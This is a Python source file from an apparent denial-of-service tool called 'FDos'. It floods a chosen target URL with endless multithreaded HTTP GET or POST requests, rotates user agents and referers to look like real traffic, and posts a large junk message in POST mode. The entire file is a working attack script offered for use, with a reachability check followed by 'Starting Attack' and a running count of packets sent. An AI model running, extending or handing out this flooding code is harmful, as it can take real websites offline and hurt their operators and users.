#############################################################
# FDos - HTTP/S GET/POST.                                   #
#############################################################
import requests
import random
import sys
import ctypes
import time
import os
import threading
import urllib3
from ddos.ua_ref import user_agent, referer
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Http:
    packet_sent = 0
    def __init__(self, method, target, sleep, thread, tipe, proxy) -> None:
        if method.upper() == "HTTP/SG":
            self.method = "get"
        else:
            self.method = "post"
        
        self.target = "http://"+target if tipe == "ip" else target
        self.sleep = sleep
        self.thread = thread
        self.http = urllib3.PoolManager()
        self.proxy = proxy


    def uparse(self, url):
        return urlparse(url).netloc

    def att_sent(self):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Total Packet Sent : {self.packet_sent}')
        # else:
        #     sys.stdout.write(f'\r\nTotal Packet Sent : {self.packet_sent}')
        #     sys.stdout.flush()
    
        
    # content-legth generator.
    def content_length(self) -> int:
        number = "1234567890"
        return ''.join(random.choice(number) for _ in range(4))

    def send(self):
        # if "https://" in self.target:
        #     port = 443
        # else:
        #     port = 80
        # connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            self.att_sent()
            try:
                headers = {
                    'Cache-Control': 'max-age=0',
                    "Connection": "keep-alive",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "Referer": referer(),
                    "User-Agent": user_agent(),
                    "Accept": "*/*"
                }
                    
                if self.method == "get":
                    resp = self.http.request('GET', self.target, headers=headers)
                else:
                    data = {"message": "fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&fuckyou&"}
                    headers["Content-Length"] = len(data["message"])
                    resp = self.http.request('POST', self.target, headers=headers, fields=data)
                #print(resp.data.decode('utf8'))
                self.packet_sent += 1
                #print(f"Packet Sent : {self.packet_sent}")
                        # while True:
                        #     part = connect.recv(1024)

            # except ConnectionRefusedError:
            #     print("Connection Refused."); time.sleep(self.sleep)
            # except socket.error as e:
            #     print(e)
            #     print("Connection Error. Maybe down"); time.sleep(self.sleep)
            # except socket.timeout:
            #     print("Timeout"); time.sleep(self.sleep)
            except urllib3.exceptions.ConnectTimeoutError:
                print(f"Timeout. Server Respon : {resp.status}"); time.sleep(self.sleep)
            except urllib3.exceptions.ConnectionError:
                print(f"ConnectError. Server Respon : {resp.status}"); time.sleep(self.sleep)
            except Exception as e:
                print(e)
                print("Unknown Error"); time.sleep(self.sleep)
            # except requests.exceptions.Timeout:
            #     print("Timeout. Maybe Down"); time.sleep(self.sleep)
            # except Exception as e: 
            #     #print(e)
            #     print("Something Error. Please check target"); time.sleep(self.sleep)

    def attack(self):
        threads = []
        # target = threading.Thread(target=self.send)
        # target.daemon = True
        # target.start()

        # while target.is_alive():
        #     pass
        print("Attack method : {}".format(self.method.upper()))
        print("Checking Connection To Target...")
        try:
            req = requests.get(self.target, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"}, allow_redirects=False, timeout=5)
            print(f"Server Respon : {req.status_code}\nStarting Attack...")
        except Exception as e:
            #print(e)
            print(f"Something wrong with target. Cannot connect\nServer Respon : {req.status_code}"); sys.exit(0)
    
        for _ in range(self.thread):
            thread = threading.Thread(target=self.send)
            threads.append(thread)
            thread.start()
        
            
        for thread in threads:
            thread.join()
        
            
        
